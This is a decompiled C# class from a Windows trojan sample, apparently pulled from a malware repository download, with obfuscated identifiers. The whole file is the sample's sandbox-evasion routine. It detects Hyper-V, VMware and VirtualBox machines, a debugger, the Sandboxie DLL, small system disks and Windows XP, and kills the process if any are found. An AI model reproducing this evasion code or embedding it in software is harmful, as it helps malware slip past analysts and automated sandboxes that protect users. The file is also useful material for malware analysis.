// Decompiled with JetBrains decompiler
// Type: xjXkkjtlfmw.OyZykNVgiFbtO
// Assembly: deinvater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89B491E0-9EDA-4D26-ADB9-208707ED33ED
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-561b48f813af5f638c5f305d21a716998cce9e0ce1ea3374fd118cec5f725885.exe

using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace xjXkkjtlfmw
{
  internal class OyZykNVgiFbtO
  {
    public static void nWyMwlgAvGEM()
    {
      if (!OyZykNVgiFbtO.AgKwdxrdgAEN() && !OyZykNVgiFbtO.cEUkJiMbmdNz() && !OyZykNVgiFbtO.yzwxsGsJfw() && !OyZykNVgiFbtO.ttwBLaeTJuoOiIa() && !OyZykNVgiFbtO.KOKTQYowfshsYlzr())
        return;
      Environment.FailFast((string) null);
    }

    private static bool ttwBLaeTJuoOiIa()
    {
      try
      {
        long num = 61000000000;
        if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool KOKTQYowfshsYlzr()
    {
      try
      {
        if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
          return true;
      }
      catch
      {
      }
      return false;
    }

    private static bool AgKwdxrdgAEN()
    {
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            foreach (ManagementBaseObject managementBaseObject in objectCollection)
            {
              string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
              if (lower == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                return true;
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    private static bool cEUkJiMbmdNz()
    {
      bool sTJjUAITpWxK = false;
      try
      {
        sieIQltZTCeoPzz.mViJcJdCMqxxF(Process.GetCurrentProcess().Handle, ref sTJjUAITpWxK);
        return sTJjUAITpWxK;
      }
      catch
      {
        return sTJjUAITpWxK;
      }
    }

    private static bool yzwxsGsJfw()
    {
      try
      {
        return sieIQltZTCeoPzz.XZsfenTdiKFedP("SbieDll.dll").ToInt32() != 0;
      }
      catch
      {
        return false;
      }
    }
  }
}
